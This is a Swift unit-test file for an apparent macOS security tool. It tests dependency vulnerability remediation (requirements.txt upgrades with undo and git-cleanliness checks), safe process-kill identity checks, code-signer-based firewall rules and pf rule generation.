        let c = Component(kind: .package, ecosystem: "PyPI", name: "transformers", version: "4.46.3",
                          location: "\(dir)/requirements.txt", direct: true, project: dir)
        let group = [finding(c, "A", fixes: ["4.48.0"]), finding(c, "B", fixes: ["4.53.0"]), finding(c, "C", fixes: [])]
        var cfg = RemediationSettings()
        cfg.installIntoVirtualenv = false
        let p = RemediationPlanner.plan(group, settings: cfg)!
        XCTAssertEqual(p.target, "4.53.0")
        XCTAssertEqual(Set(p.fixes), ["A", "B"])
        XCTAssertEqual(p.unfixable, ["C"])
        XCTAssertNil(p.blocked)
        XCTAssertEqual(p.steps.first?.diff, ["- transformers==4.46.3", "+ transformers==4.53.0"])

        let major = RemediationPlanner.plan([finding(c, "D", fixes: ["5.5.0"])], settings: cfg)!
        XCTAssertNotNil(major.blocked, "major upgrades need opting in")
        cfg.allowMajorUpgrades = true
        XCTAssertNil(RemediationPlanner.plan([finding(c, "D", fixes: ["5.5.0"])], settings: cfg)!.blocked)

        let exposed = Component(kind: .service, name: "redis-server", version: "", location: "port 6379", exposedPorts: [6379])
        let ep = RemediationPlanner.plan([finding(exposed, "EXPOSED-TCP-6379", fixes: [])], settings: cfg)!
        XCTAssertEqual(ep.steps.first?.kind, .firewallRule)
        XCTAssertEqual(ep.steps.first?.port, 6379)
        let app = Component(kind: .app, name: "Visual Studio Code", version: "1.128.1", location: "/Applications/Visual Studio Code.app")
        XCTAssertNotNil(RemediationPlanner.plan([finding(app, "CVE-1", fixes: ["1.132.1"])], settings: cfg)!.blocked, "apps update themselves")
    }

    func testApplyVerifyAndUndo() throws {
        let dir = tempProject(["requirements.txt": "fastapi==0.115.6\npython-multipart==0.0.17\n"])
        let c = Component(kind: .package, ecosystem: "PyPI", name: "python-multipart", version: "0.0.17",
                          location: "\(dir)/requirements.txt", direct: true, project: dir)
        var cfg = RemediationSettings()
        cfg.installIntoVirtualenv = false
        let plan = RemediationPlanner.plan([finding(c, "GHSA-x", fixes: ["0.0.22"])], settings: cfg)!
        let backups = URL(fileURLWithPath: dir).appendingPathComponent(".backups")
        let r = RemediationExecutor.execute(plan, backupDir: backups, automatic: false) { _ in }
        XCTAssertEqual(r.status, .succeeded)
        XCTAssertEqual(r.verifiedVersion, "0.0.22")
        XCTAssertTrue(try String(contentsOfFile: "\(dir)/requirements.txt", encoding: .utf8).contains("python-multipart==0.0.22"))
        _ = RemediationExecutor.undo(r) { _ in }
        XCTAssertEqual(try String(contentsOfFile: "\(dir)/requirements.txt", encoding: .utf8), "fastapi==0.115.6\npython-multipart==0.0.17\n")

        // A file edited after planning isn't overwritten.
        try "fastapi==0.115.6\npython-multipart==0.0.17\n# edited by hand\n".write(toFile: "\(dir)/requirements.txt", atomically: true, encoding: .utf8)
        let stale = RemediationExecutor.execute(plan, backupDir: backups, automatic: false) { _ in }
        XCTAssertNotEqual(stale.status, .succeeded)
        XCTAssertTrue(try String(contentsOfFile: "\(dir)/requirements.txt", encoding: .utf8).contains("# edited by hand"))
    }

    func testDirtyGitBlocksRemediation() throws {
        let dir = tempProject(["requirements.txt": "requests==2.19.0\n"])
        let git = RemediationPlanner.tool("git")!
        RemediationPlanner.run([git, "init", "-q", dir])
        RemediationPlanner.run([git, "-C", dir, "-c", "user.email=t@t", "-c", "user.name=t", "add", "."])
        RemediationPlanner.run([git, "-C", dir, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "init"])
        let c = Component(kind: .package, ecosystem: "PyPI", name: "requests", version: "2.19.0",
                          location: "\(dir)/requirements.txt", direct: true, project: dir)
        var cfg = RemediationSettings()
        cfg.installIntoVirtualenv = false
        XCTAssertNil(RemediationPlanner.plan([finding(c, "A", fixes: ["2.20.0"])], settings: cfg)!.blocked, "clean repo is fine")
        try "requests==2.19.0\nflask==1.0\n".write(toFile: "\(dir)/requirements.txt", atomically: true, encoding: .utf8)
        XCTAssertNotNil(RemediationPlanner.plan([finding(c, "A", fixes: ["2.20.0"])], settings: cfg)!.blocked)
    }

    /// Live integration check (runs only with TEST_RUNNER_ELLIOTT_LIVE_PROJECT=<dir with .venv + requirements.txt>):
    /// real pip upgrade, verification from the virtualenv, and pip-based undo. Also dry-runs the Homebrew planner.
    func testLiveRemediation() throws {
        guard let dir = ProcessInfo.processInfo.environment["ELLIOTT_LIVE_PROJECT"] else { throw XCTSkip("live test not requested") }
        let c = Component(kind: .package, ecosystem: "PyPI", name: "python-multipart", version: "0.0.17",
                          location: "\(dir)/requirements.txt", direct: true, project: dir)
        let plan = RemediationPlanner.plan([finding(c, "GHSA-59g5-xgcq-4qw3", fixes: ["0.0.18"])], settings: RemediationSettings())!
        XCTAssertEqual(plan.steps.map(\.kind), [.edit, .command])
        let r = RemediationExecutor.execute(plan, backupDir: URL(fileURLWithPath: "\(dir)/.backups"), automatic: false) { print("LIVE:", $0) }
        XCTAssertEqual(r.status, .succeeded)
        XCTAssertEqual(r.verifiedVersion, "0.0.18", "verified from the virtualenv, not just the requirements file")
        _ = RemediationExecutor.undo(r) { print("LIVE UNDO:", $0) }
        XCTAssertEqual(RemediationExecutor.installedVersion(c), "0.0.17", "pip undo reinstalled the old version")

        let brewC = Component(kind: .homebrew, name: "openssl@3", version: "3.5.1", cpe: "a:openssl:openssl", location: "")
        let bp = RemediationPlanner.plan([finding(brewC, "CVE-2025-15467", fixes: ["3.5.5"])], settings: RemediationSettings())!
        print("LIVE BREW PLAN:", bp.steps.map(\.summary), "blocked:", bp.blocked ?? "no", "warnings:", bp.warnings)
    }

    func testKillIdentityUsesStartTime() throws {
        let me = getpid()
        let start = try XCTUnwrap(ProcessTable.startTime(me))
        XCTAssertTrue(ProcessTable.isSameProcess(me, startedAt: start))
        XCTAssertFalse(ProcessTable.isSameProcess(me, startedAt: start.addingTimeInterval(-60)), "same pid, different process")
        XCTAssertNil(ProcessTable.startTime(999_999), "no such process")

        // A finding for a process that has exited (or whose pid was reused) is never killed.
        let sleeper = Process()
        sleeper.executableURL = URL(fileURLWithPath: "/bin/sleep")
        sleeper.arguments = ["30"]
        try sleeper.run()
        let pid = sleeper.processIdentifier
        let sleeperStart = try XCTUnwrap(ProcessTable.startTime(pid))
        var f = Finding(key: "k", rule: "r", title: "t", detail: "", severity: .high, category: .process, mitre: [],
                        path: "/bin/sleep", pid: pid, processStart: sleeperStart.addingTimeInterval(-5))
        XCTAssertFalse(ProcessTable.isSameProcess(pid, startedAt: f.processStart!), "stale start time must not match")
        f.processStart = sleeperStart
        XCTAssertTrue(ProcessTable.isSameProcess(pid, startedAt: f.processStart!))
        sleeper.terminate()
        sleeper.waitUntilExit()
        XCTAssertFalse(ProcessTable.isSameProcess(pid, startedAt: sleeperStart), "exited")
    }

    // MARK: Signers

    func testSignerRules() {
        var trustGoogle = Rule(appKey: "*", appName: "Google LLC", direction: .outbound, proto: nil, host: "*", port: nil, verdict: .allow)
        trustGoogle.signer = "EQHXZ8M8AV"
        let chrome = event(app: "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", team: "EQHXZ8M8AV", id: "com.google.Chrome")
        let drive = event(app: "/Applications/Google Drive.app/Contents/MacOS/Google Drive", team: "EQHXZ8M8AV", id: "com.google.drivefs")
        let fake = event(app: "/tmp/Google Chrome", team: nil, id: "com.google.Chrome")   // ad-hoc copy claiming the same identifier
        XCTAssertTrue(trustGoogle.matches(chrome))
        XCTAssertTrue(trustGoogle.matches(drive))
        XCTAssertFalse(trustGoogle.matches(fake), "only verified team signatures count")
        XCTAssertFalse(trustGoogle.matches(event(team: "OTHERTEAM")))

        // A specific app decision beats its signer's.
        let denyDrive = Rule(key: drive.key, appName: "Google Drive", verdict: .deny)
        XCTAssertEqual(RuleBook.decide(drive, rules: [trustGoogle, denyDrive])?.verdict, .deny)
        XCTAssertEqual(RuleBook.decide(chrome, rules: [trustGoogle, denyDrive])?.verdict, .allow)

        var apple = trustGoogle
        apple.signer = "apple"
        let apsd = FlowEvent(pid: 1, processPath: "/usr/libexec/apsd", signingID: "com.apple.apsd", appleSigned: true,
                             direction: .outbound, proto: .tcp, remoteAddress: "17.1.1.1", remotePort: 5223, outcome: .allowed)
        XCTAssertTrue(apple.matches(apsd))
        XCTAssertFalse(apple.matches(chrome))
    }

    func testSignerRulesNeverOpenEverything() {
        var trust = Rule(appKey: "*", appName: "Google LLC", direction: .outbound, proto: nil, host: "*", port: nil, verdict: .allow)
        trust.signer = "EQHXZ8M8AV"
        var inbound = trust
        inbound.direction = .inbound
        let pf = PFRules.generate(FilterPolicy(rules: [trust, inbound], lockdown: true))
        XCTAssertFalse(pf.contains("from any to any keep state"), "a signer rule must not become allow-all in pf")
        trust.addresses = ["142.250.72.14"]
        XCTAssertTrue(PFRules.generate(FilterPolicy(rules: [trust], lockdown: true)).contains("142.250.72.14"), "learned addresses are passed")
        let plan = PolicyPlanner.plan(rules: [trust], descriptions: [:], macAddress: "192.168.1.5", lockdown: false, mirrorLockdown: false)
        XCTAssertTrue(plan.rules.isEmpty)
        XCTAssertTrue(plan.notes.first?.contains("code signatures") ?? false)
    }

    func testSignerNames() throws {
        XCTAssertEqual(Signers.developerName("Developer ID Application: Google LLC (EQHXZ8M8AV)"), "Google LLC")
        XCTAssertEqual(Signers.developerName("Developer ID Application: Mozilla Corporation (43AQ936H96)"), "Mozilla Corporation")
        let firefox = "/Applications/Firefox.app/Contents/MacOS/firefox"
        guard FileManager.default.fileExists(atPath: firefox) else { throw XCTSkip("Firefox not installed") }
        let (_, team, _) = PassiveMonitor.staticIdentity(firefox)
        let info = Signers.shared.info(path: firefox, teamID: team, appleSigned: false)
        XCTAssertEqual(info.kind, .developer)
        XCTAssertEqual(info.display, "Mozilla Corporation")
        XCTAssertEqual(Signers.shared.info(path: "/usr/libexec/apsd", teamID: nil, appleSigned: true).display, "Apple")
    }

    func testHideOptions() {
        var p = Profile(event: event())
        p.count = 3
        let allowed = ConsoleRow(profile: p, rule: Rule(key: p.key, appName: "Foo", verdict: .allow))
        let open = ConsoleRow(profile: p, rule: nil)
        XCTAssertTrue(HideOption.allowed.hides(allowed))
        XCTAssertFalse(HideOption.denied.hides(allowed))
        XCTAssertTrue(HideOption.unclassified.hides(open))
        XCTAssertTrue(HideOption.outbound.hides(open))
        XCTAssertFalse(HideOption.inbound.hides(open))
        let lan = ConsoleRow(profile: Profile(event: event(host: nil, ip: "192.168.1.20")), rule: nil)
        XCTAssertTrue(HideOption.localNetwork.hides(lan))
    }
}
